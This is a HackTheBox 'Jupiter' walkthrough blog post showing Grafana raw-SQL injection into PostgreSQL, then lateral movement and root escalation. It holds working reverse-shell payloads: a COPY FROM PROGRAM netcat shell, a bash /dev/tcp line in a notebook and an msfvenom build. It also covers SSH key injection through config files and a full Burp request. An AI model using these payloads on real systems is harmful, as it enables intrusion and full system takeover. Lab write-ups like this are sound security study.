---
title: "SQL Injection by Default in Grafana (HTB — Jupiter)"
date: 2023-10-26
lane: "offense"
description: "A walkthrough of HackTheBox Jupiter, demonstrating how Grafana's raw SQL passthrough to PostgreSQL can be exploited for remote code execution and full system compromise."
tags: ["hackthebox", "sql-injection", "grafana", "postgresql", "linux", "privilege-escalation"]
featured: false
draft: false
canonical_url: "https://medium.com/bugbountywriteup/sql-injection-by-default-in-grafana-htb-jupiter-6b7b8825fdaa"
---

## Introduction

Over the past several years, we've seen a lot of people using powerful visualization and graphing tools like Grafana. You can use Grafana in a standalone mode as its own web application, but it also possible to integrate Grafana into an existing application to allow users to create their own graphs and charts. There is a known problem with Grafana that it allows raw sql to be passed to any datasource. A malicious user can intercept and modify the requests to these datasources to disclose information, possibly read files or even achieve code execution!

Hackthebox.com released a new challenge machine on June 3, 2023 that highlights the issues associated with this vulnerability. This article will walk through the specifics of how I was able to use this to gain an initial foothold to the box.

## Reconnaissance

As with every box, we start with an IP address and begin an active scan with our favourite tool, nmap

```
Nmap scan report for 10.129.173.236
Host is up (0.10s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 256 ac5bbe792dc97a00ed9ae62b2d0e9b32 (ECDSA)
|_ 256 6001d7db927b13f0ba20c6c900a71b41 (ED25519)
80/tcp open http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://jupiter.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only 2 ports available, and SSH appears to be running an up-to-date version based on the banner grab (OpenSSH 8.9p1 Ubuntu).

## Web Enumeration

So we focus in on port 80. nmap tells us that the request redirects to jupiter.htb so let's add that to our `/etc/hosts` and fire up the fox!

A quick walk around the jupiter.htb site yields nothing of interest. I did throw a lot of gobuster wizardry at it to see if there was anything good. Eventually I started looking at possible subdomains using wfuzz

```bash
wfuzz -c -f sub-fighter -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://jupiter.htb' -H "Host: FUZZ.jupiter.htb" -hc 301
```

This returned a new subdomain (kiosk.jupiter.htb). Let's add it to `/etc/hosts` and see what's up…

## Grafana Enumeration

We discover a cool looking Grafana dashboard? Look at all this great information about moons! I tried logging in to the grafana console using default admin:admin credentials, and I started looking at the panels. I see that there is a data source called PostgreSQL that is driving the data, I can also see the raw sql that is being used to generate these reports… I wonder how this is passed through to the server?

I opened up the firefox dev tools and went to the network tab. Eventually I landed on an interesting POST request to `http://kiosk.jupiter.htb/api/ds/query` containing the rawSql payload to be sent to PostGres!!!!

Let's intercept in Burp and see what we can do!

Playing with the post in burp, I can enumerate the database (it contains only one table called moons; I was able to pull the username and password hash from the pg_shadow table as well, but a hashcat attack with rockyou.txt came up empty. I've included here for reference. Your mileage may vary.

```bash
hashcat -m 28600 loot/grafana_viewer.hash /usr/share/wordlists/rockyou.txt --potfile-disable
```

So, let's turn our attention to what else we can do with Postgres

## Remote Code Execution via Burp and Postgres

Here's where the wonderful resource, hacktricks, comes to the rescue. After reading through the PostgreSQL pentesting page, I modified a PoC which allowed me to get remote code execution via postgres!

I'll include the full Burp request in the Appendix, but here's the crucial part. Don't forget to set up a netcat listener to catch the request after you post.

On Kali:

```bash
nc -lnvp 5555
```

In BurpSuite:

```json
"rawSql":"DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.86 5555 >/tmp/f';SELECT * FROM cmd_exec;DROP TABLE IF EXISTS cmd_exec;"
```

Et voila! Shell as postgres user. This shell is only good for about 1 minute… it's tied to the database query which will eventually timeout. So let's add an `&` to the end of the command to have it run in a background thread.

Now we upgrade the shell with a few commands so we have better access.

In the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash");'
```

Then `ctrl-z` to background the reverse shell

In bash on kali type:

```bash
stty raw -echo
stty size
```

The size command should give you the number of rows and columns in your terminal. Take those size values and get ready to plug them back into your rev shell.

On Kali:

```
fg
<hit enter twice until you get a prompt again>
```

Then, in the shell:

```bash
export SHELL=bash
stty rows $x columns $y
export TERM=xterm-256color
```

Now we have a lovely interactive TTY shell!

## Enumerating Linux

Now that we have a stable shell it's time to start looking around for the usual suspects.

`/etc/passwd` shows that there are two other interesting users "juno" and "jovian". Let's see what they can do.

```bash
find / -user juno 2>/dev/null
```

This returns a bevy of results, but interestingly there are some files in the `/dev/shm` folder which need further investigation.

After a bit of googling, it seems that juno is running Shadow Simulator, a network simulation tool.

Figuring out that juno is running a job to automate this test takes some inference from reading the documentation and observing the timestamps on the files, or from uploading and running pspy64.

```
2023/06/06 17:26:01 CMD: UID=1000  PID=7499   | /bin/bash /home/juno/shadow-simulation.sh
2023/06/06 17:26:01 CMD: UID=1000  PID=7510   | /usr/bin/python3 -m http.server 80
2023/06/06 17:26:01 CMD: UID=1000  PID=7511   | /usr/bin/curl -s server
2023/06/06 17:26:02 CMD: UID=1000  PID=7520   | cp -a /home/juno/shadow/examples/http-server/network-simulation.yml /dev/shm
```

After reading the documentation and some of the examples, we see that the `network-simulation.yml` file is parsed every time the shell script runs. From here there are a couple of different ways to get access as juno.

### Path 1 — Write a public key

So let's use that to add a public key to `/home/juno/.ssh/authorized_keys`

First we use ssh-keygen to build a keypair. Then edit the `id_rsa.pub` file to change the user to juno@jupiter

Next, in your reverse shell add a file called mykey to the `/dev/shm` folder (make sure you adjust the permissions so that juno can read it!)

Then, modify the `network-simulation.yml` file as follows in the client section:

```yaml
client:
  network_node_id: 0
  quantity: 3
  processes:
    - path: /usr/bin/curl
      args: file:///dev/shm/mykey -o /home/juno/.ssh/authorized_keys
      start_time: 5s
```

Once this is run we can log in via ssh as juno.

### Path 2 — Spawn a reverse shell

As in path 1, we need to modify the yml file, but this time we do the following:

In Kali, use msfvenom:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.86 LPORT=4444 -f elf > shell.elf
```

Then copy the file to the victim. Make sure that juno can run it (`chmod 777 shell.elf`)

Set up another NC listener, then modify the yml file as follows:

```yaml
client:
  network_node_id: 0
  quantity: 3
  processes:
    - path: /tmp/shell.elf
      args: ""
      start_time: 5s
```

You will catch a shell as juno.

The user flag is located at `/home/juno/user.txt`

## Lateral Movement from juno to jovian

Looking at juno, we see that this user is a member of the science group. We can also learn that jovian is also a member of this group. If we look for items belonging to science, we find the following:

```bash
find / -group science 2>/dev/null
/opt/solar-flares
```

There is a folder called solar-flares, and this contains some logs with the name prefix jupyter and a file called `flares.ipynb`. It appears that this system is running Jupyter Notebook. With a bit more investigation, we also see that there's a service running on port 8888. It's time to port forward and find out!

On Kali:

```bash
ssh -L 9999:127.0.0.1:8888 juno@jupiter.htb -i ssh-keys/id_rsa
```

Now we can open up Firefox and browse to `http://127.0.0.1:9999`

When we open `flares.ipynb`, we see that it is python code! So, let's add some python to execute a reverse shell back to our Kali box.

I added a new section below the imports that contained the following (as always, prep your listener before you hit the run button):

```python
import os; os.system('bash -c "bash -i >& /dev/tcp/10.10.14.86/4444 0>&1"');
```

My listener sparks to life with a shell as jovian!

## Intended Path to Root

Now that you have shell as jovian, I highly recommend adding your public key to the authorized_keys for this user before continuing… or you may find your shell drops and jupyter ends up in a state where it won't call you anymore (don't ask me how I know!)

There's an interesting file we can run via sudo!

```bash
jovian@jupiter:/$ sudo -l
User jovian may run the following commands on jupiter:
    (ALL) NOPASSWD: /usr/local/bin/sattrack
```

Running sattrack, it complains that it is missing a configuration file! Well let's see if we can make it happy.

It turns out that this is an ELF executable file so let's see if we can learn anything about it by running strings:

```bash
jovian@jupiter:/$ strings /usr/local/bin/sattrack | grep config
/tmp/config.json
tleroot not defined in config
updatePerdiod not defined in config
station not defined in config
```

So now we've learned that it's looking for a `config.json` file and it would appear the default location it looks in is `/tmp/config.json`

We locate the file at `/usr/local/share/sattrack/config.json`. I make a copy and put it in `/tmp/config.json` so I can do some test runs.

When you run it the first time, it tries to reach out to `https://celestrak.org` to get information about weather satellites, but it fails to resolve the host. We also see that it logs the results of the http-requests into a folder called `/tmp/tle`. What if I modify this config to look for files instead of making http requests?

A quick edit to config.json to change one of the tle sources:

```json
"tlesources": [
   "file:///root/root.txt"
]
```

Run it again and root.txt appears in the `/tmp/tle` folder… but what if that's not good enough and you want shell as root?

A few more edits and my config file looks like the following:

```json
{
    "tleroot": "/root/.ssh/",
    "tlefile": "",
    "mapfile": "/usr/local/share/sattrack/map.json",
    "texturefile": "/usr/local/share/sattrack/earth.png",
    "tlesources": [
        "file:///tmp/authorized_keys",
        "file:///",
        "file:///"
    ],
    "updatePerdiod": 1000,
    "station": {
        "name": "LORCA",
        "lat": 37.6725,
        "lon": -1.5863,
        "hgt": 335.0
    },
    "show": [],
    "columns": [
        "name", "azel", "dis", "geo", "tab", "pos", "vel"
    ]
}
```

So this config takes a page from the playbook we used to get ssh as juno and I created a new file `/tmp/authorized_keys` that contains my `id_rsa.pub` with a modification at the end to set the user to root@jupiter

Then I run the command again and now I can log in via ssh as root!

## Alternate Path to Root

I found an unintended root path which is incredibly simple, and a little funny.

```bash
jovian@jupiter:~$ ls -al /usr/local/bin/sattrack
-rwxrwxr-x 1 jovian jovian 1113632 Mar  8 12:07 /usr/local/bin/sattrack
jovian@jupiter:~$ cp /bin/bash /usr/local/bin/sattrack
jovian@jupiter:~$ sudo /usr/local/bin/sattrack
```

So what's happening here? Well, jovian can run this sattrack application as root via sudoers. When I take a look at the file, the permissions allow read/write/execute for nearly anybody! So I simply overwrite sattrack with `/bin/bash` and then execute it via sudo… now I have a root shell!

## Conclusion

This was a very fun challenge and highlighted some areas for concern with respect to Grafana. This POST to `/api/ds/query` is enabled in every Grafana deployment, and allows raw SQL to be sent to the data source. In many instances, this could lead to inadvertent data disclosure, but in this case I was able to get remote code execution, and eventually leverage a basic shell to get full root access to the box! Kudos to the creator of this box, mto, for creating an educational and entertaining challenge.

## Appendix — Burp Request for Reverse Shell as postgres user

```
POST /api/ds/query HTTP/1.1
Host: kiosk.jupiter.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://kiosk.jupiter.htb/d/jMgFGfA4z/moons?orgId=1&refresh=1d
content-type: application/json
x-dashboard-uid: jMgFGfA4z
x-datasource-uid: YItSLg-Vz
x-grafana-org-id: 1
x-panel-id: 28
x-plugin-id: postgres
Origin: http://kiosk.jupiter.htb
Content-Length: 549
Connection: close

{"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.86 5555 >/tmp/f&';SELECT * FROM cmd_exec;DROP TABLE IF EXISTS cmd_exec;","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":940}],"range":{"from":"2023-06-05T08:18:57.650Z","to":"2023-06-05T14:18:57.650Z","raw":{"from":"now-6h","to":"now"}},"from":"1685953137650","to":"1685974737650"}
```

---

*Originally published on [InfoSec Write-ups](https://medium.com/bugbountywriteup/sql-injection-by-default-in-grafana-htb-jupiter-6b7b8825fdaa)*

`bksp_ // enumerate. prove. document.`
